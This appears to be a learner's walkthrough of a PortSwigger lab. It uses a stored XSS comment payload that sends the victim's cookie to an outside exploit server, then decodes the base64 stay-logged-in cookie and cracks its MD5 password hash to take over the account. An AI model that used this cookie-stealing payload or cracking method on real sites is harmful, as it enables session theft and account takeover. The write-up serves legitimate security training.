
# Offline password cracking

This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.

- Your credentials: wiener:peter

- Victim's username: carlos

Learning path: If you're following our suggested learning path, please note that this lab requires some understanding of topics that we haven't covered yet. Don't worry if you get stuck; try coming back later once you've developed your knowledge further.

---------------------------------------------

References: 

- https://portswigger.net/web-security/authentication/other-mechanisms



![img](images/Offline%20password%20cracking/1.png)

---------------------------------------------

First I will create a comment with this payload to send the cookie to the exploit server:

```
<script>var i=new Image;i.src="https://exploit-0a500006035b831a8133a1940130000d.exploit-server.net/log?cookie="+document.cookie;</script>
```



![img](images/Offline%20password%20cracking/2.png)


We get the value from carlos' cookie:



![img](images/Offline%20password%20cracking/3.png)


Then I logged in as wiener and got the “stay-logged-in” cookie “d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw”:



![img](images/Offline%20password%20cracking/4.png)


It uses the same password structure as the previous lab, BASE64(user:MD5(password)):



![img](images/Offline%20password%20cracking/5.png)


It seems it is the MD5 hash for “onceuponatime”:



![img](images/Offline%20password%20cracking/6.png)


So we can now connect and delete the account:



![img](images/Offline%20password%20cracking/7.png)